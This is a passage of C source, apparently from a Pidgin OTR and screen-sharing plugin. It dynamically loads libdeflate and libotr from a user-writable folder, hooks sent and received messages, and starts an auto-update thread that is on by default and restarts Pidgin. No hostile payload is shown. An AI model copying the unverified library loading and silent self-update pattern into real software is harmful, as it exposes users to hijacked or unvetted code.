         libdeflate_alloc_compressor_func = (libdeflate_alloc_compressor_t)GetProcAddress((HMODULE)module_libdeflate, "libdeflate_alloc_compressor");
         libdeflate_deflate_compress_bound_func = (libdeflate_deflate_compress_bound_t)GetProcAddress((HMODULE)module_libdeflate, "libdeflate_deflate_compress_bound");
         libdeflate_deflate_compress_func = (libdeflate_deflate_compress_t)GetProcAddress((HMODULE)module_libdeflate, "libdeflate_deflate_compress");
         libdeflate_free_compressor_func = (libdeflate_free_compressor_t)GetProcAddress((HMODULE)module_libdeflate, "libdeflate_free_compressor");
         libdeflate_alloc_decompressor_func = (libdeflate_alloc_decompressor_t)GetProcAddress((HMODULE)module_libdeflate, "libdeflate_alloc_decompressor");
         libdeflate_deflate_decompress_func = (libdeflate_deflate_decompress_t)GetProcAddress((HMODULE)module_libdeflate, "libdeflate_deflate_decompress");
         libdeflate_free_decompressor_func = (libdeflate_free_decompressor_t)GetProcAddress((HMODULE)module_libdeflate, "libdeflate_free_decompressor");
         is_deflate_loaded = 1;
      }
      else gtk_messagebox("Failed to load libdeflate! Download libdeflate.dll, and place it in the Appdata\\pidgin-ssotr folder then try again.");
      
      wchar_t libotr_path[260] = {0};
      ExpandEnvironmentStringsW(L"%APPDATA%\\pidgin-ssotr\\libotr.dll", libotr_path, 260 - 1);
      module_libotr = LoadLibraryW(libotr_path);
      if (module_libotr)
      {
         otrl_init_func = (otrl_init_t)GetProcAddress((HMODULE)module_libotr, "otrl_init");
         otrl_message_receiving_func = (otrl_message_receiving_t)GetProcAddress((HMODULE)module_libotr, "otrl_message_receiving");
         otrl_message_sending_func = (otrl_message_sending_t)GetProcAddress((HMODULE)module_libotr, "otrl_message_sending");
         otrl_userstate_create_func = (otrl_userstate_create_t)GetProcAddress((HMODULE)module_libotr, "otrl_userstate_create");
         otrl_privkey_read_func = (otrl_privkey_read_t)GetProcAddress((HMODULE)module_libotr, "otrl_privkey_read");
         otrl_privkey_read_fingerprints_func = (otrl_privkey_read_fingerprints_t)GetProcAddress((HMODULE)module_libotr, "otrl_privkey_read_fingerprints");
         otrl_instag_generate_func = (otrl_instag_generate_t)GetProcAddress((HMODULE)module_libotr, "otrl_instag_generate");
         otrl_privkey_generate_func = (otrl_privkey_generate_t)GetProcAddress((HMODULE)module_libotr, "otrl_privkey_generate");
         otrl_instag_read_func = (otrl_instag_read_t)GetProcAddress((HMODULE)module_libotr, "otrl_instag_read");
         otrl_privkey_fingerprint_func = (otrl_privkey_fingerprint_t)GetProcAddress((HMODULE)module_libotr, "otrl_privkey_fingerprint");
         otrl_userstate_free_func = (otrl_userstate_free_t)GetProcAddress((HMODULE)module_libotr, "otrl_userstate_free");
         is_otr_loaded = 1;
      }
   #else
      char libdeflate_path[260] = {0};
      sprintf(libdeflate_path, "%s/pidgin-ssotr/libdeflate.so", getenv("HOME"));
      module_libdeflate = dlopen(libdeflate_path, RTLD_LAZY);
      if (module_libdeflate)
      {
         libdeflate_alloc_compressor_func = (libdeflate_alloc_compressor_t)dlsym(module_libdeflate, "libdeflate_alloc_compressor");
         libdeflate_deflate_compress_bound_func = (libdeflate_deflate_compress_bound_t)dlsym(module_libdeflate, "libdeflate_deflate_compress_bound");
         libdeflate_deflate_compress_func = (libdeflate_deflate_compress_t)dlsym(module_libdeflate, "libdeflate_deflate_compress");
         libdeflate_free_compressor_func = (libdeflate_free_compressor_t)dlsym(module_libdeflate, "libdeflate_free_compressor");
         libdeflate_alloc_decompressor_func = (libdeflate_alloc_decompressor_t)dlsym(module_libdeflate, "libdeflate_alloc_decompressor");
         libdeflate_deflate_decompress_func = (libdeflate_deflate_decompress_t)dlsym(module_libdeflate, "libdeflate_deflate_decompress");
         libdeflate_free_decompressor_func = (libdeflate_free_decompressor_t)dlsym(module_libdeflate, "libdeflate_free_decompressor");
         is_deflate_loaded = 1;
      }
      else gtk_messagebox("Failed to load libdeflate! Download libdeflate.so, and place it in the Home Directory 'pidgin-ssotr' folder then try again.");

      char libotr_path[260] = {0};
      sprintf(libotr_path, "%s/pidgin-ssotr/libotr.so", getenv("HOME"));
      module_libotr = dlopen(libotr_path, RTLD_LAZY);
      if (module_libotr)
      {
         otrl_init_func = (otrl_init_t)dlsym(module_libotr, "otrl_init");
         otrl_message_receiving_func = (otrl_message_receiving_t)dlsym(module_libotr, "otrl_message_receiving");
         otrl_message_sending_func = (otrl_message_sending_t)dlsym(module_libotr, "otrl_message_sending");
         otrl_userstate_create_func = (otrl_userstate_create_t)dlsym(module_libotr, "otrl_userstate_create");
         otrl_privkey_read_func = (otrl_privkey_read_t)dlsym(module_libotr, "otrl_privkey_read");
         otrl_privkey_read_fingerprints_func = (otrl_privkey_read_fingerprints_t)dlsym(module_libotr, "otrl_privkey_read_fingerprints");
         otrl_instag_generate_func = (otrl_instag_generate_t)dlsym(module_libotr, "otrl_instag_generate");
         otrl_privkey_generate_func = (otrl_privkey_generate_t)dlsym(module_libotr, "otrl_privkey_generate");
         otrl_instag_read_func = (otrl_instag_read_t)dlsym(module_libotr, "otrl_instag_read");
         otrl_privkey_fingerprint_func = (otrl_privkey_fingerprint_t)dlsym(module_libotr, "otrl_privkey_fingerprint");
         otrl_userstate_free_func = (otrl_userstate_free_t)dlsym(module_libotr, "otrl_userstate_free");
         is_otr_loaded = 1;
      }
   #endif

   // note: this part enables the autoupdater functionality so that in case a newer version of the plugin is available, the plugin is updated & pidgin is restarted
   #ifdef _WIN32
   void* communication_thread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)talk_to_update_server, NULL, 0, NULL);
   #else
   pthread_t communication_thread;
   pthread_create(&communication_thread, NULL, (void* (*)(void*))talk_to_update_server, NULL);
   #endif

	otrl_init_func(4, 1, 0);

	purple_signal_connect(purple_conversations_get_handle(), "conversation-created", plugin, G_CALLBACK(add_menu_item_cb), NULL);
   purple_signal_connect(purple_conversations_get_handle(), "writing-im-msg", plugin, PURPLE_CALLBACK(intercept_incoming_message), 0);
   purple_signal_connect(purple_conversations_get_handle(), "sending-im-msg", plugin, PURPLE_CALLBACK(intercept_sending_message), 0);

	return TRUE;
}

static gboolean
plugin_unload(PurplePlugin *plugin)
{
   purple_conversation_foreach(remove_menu_item);
   #ifdef _WIN32
   WSACleanup();
   #endif
	return TRUE;
}

static PurplePluginPrefFrame *screenshare_config_frame(PurplePlugin *plugin)
{
   PurplePluginPrefFrame *frame = purple_plugin_pref_frame_new();
   PurplePluginPref *pref = purple_plugin_pref_new_with_name_and_label(PREF_UPDATE, g_strdup_printf("Enable Automatic Updates"));
   purple_plugin_pref_frame_add(frame, pref);
   return frame;
}

static PurplePluginUiInfo config_menu =
{
   screenshare_config_frame,   
   NULL,
   NULL,
   NULL,
   NULL,
   NULL,
   NULL
};

static PurplePluginInfo info =
{
	PURPLE_PLUGIN_MAGIC,
	PURPLE_MAJOR_VERSION,
	PURPLE_MINOR_VERSION,
	PURPLE_PLUGIN_STANDARD,
	NULL,
	0,
	NULL,
	PURPLE_PRIORITY_HIGHEST,
	PLUGIN_ID,
	PLUGIN_NAME,
	"1.1.2",
	PLUGIN_SUMMARY,
	PLUGIN_DESCRIPTION,
	PLUGIN_AUTHOR,
	"https://pidgin.im/plugins/?query=ssotr",
	plugin_load,
	plugin_unload,
	NULL,

	NULL,
	NULL,
   &config_menu,
	NULL,

	NULL,
	NULL,
	NULL,
	NULL
};

static void
init_plugin(PurplePlugin *plugin)
{
	purple_prefs_add_none(PREF_PREFIX);
   purple_prefs_add_bool(PREF_UPDATE, TRUE);
}

PURPLE_INIT_PLUGIN(PLUGIN_STATIC_NAME, init_plugin, info)